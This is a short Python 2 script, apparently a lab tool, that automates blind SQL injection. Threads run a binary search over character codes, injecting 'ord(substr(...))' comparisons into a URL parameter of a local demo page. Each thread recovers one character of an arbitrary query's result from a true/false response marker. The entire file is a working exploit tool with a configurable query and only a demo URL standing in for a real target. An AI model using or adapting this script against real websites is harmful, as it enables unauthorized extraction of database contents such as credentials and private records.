import threading
import time
import requests
import argparse
import Queue

class Duncan(threading.Thread):
	def __init__(self,query='select version()',pos=1,q=None,ascii_begin=32,ascii_end=123):
		threading.Thread.__init__(self)
		self._query=query
		self._pos=pos
		self._min=ascii_begin
		self._max=ascii_end

	def run(self):
		while self._max-self._min>1:
			guess=self._min+(self._max-self._min)/2
			#print self._max, guess, self._min
			if self.decide(guess):
				self._max=guess-1
			else:
				self._min=guess
		if self.decide(self._max):
			print "Position %d: %c" % (self._pos,chr(self._min))
			q.put((self._pos,chr(self._min)))
		else:
			print "Position %d: %c" % (self._pos,chr(self._max))
			q.put((self._pos,chr(self._max)))


	def decide(self,guess,less_than_guess=True):
		"""Here you should implement your injection code.

		Arguments:
		guess -- Guess

		Should return True if the actual ASCII value of a given position is less than guess
		""" 
		url="http://localhost/demo/sqli/blind.php?p=1 and ord(substr((%s),%d,1))<%d" % (self._query,self._pos,guess)
		r=requests.get(url)
		
		if r.content.find(':)')>-1:
			return True
		else:
			return False

parser = argparse.ArgumentParser(description='Blind SQL injector')
parser.add_argument("--query",required=True)
parser.add_argument("--pos-start",default=1,type=int)
parser.add_argument("--pos-end",default=5,type=int)
parser.add_argument("--ascii-start",default=32,type=int)
parser.add_argument("--ascii-end",default=123,type=int)

args = parser.parse_args()
q=Queue.Queue()
threads=[]
for p in xrange(args.pos_start,args.pos_end):
	thread=Duncan(args.query,p,q,args.ascii_start,args.ascii_end)
	threads.append(thread)
	thread.start()

for t in threads:
	t.join()

l=[]
while not q.empty():
	l.append(q.get())

print ''.join([i[1] for i in sorted(list(l))])
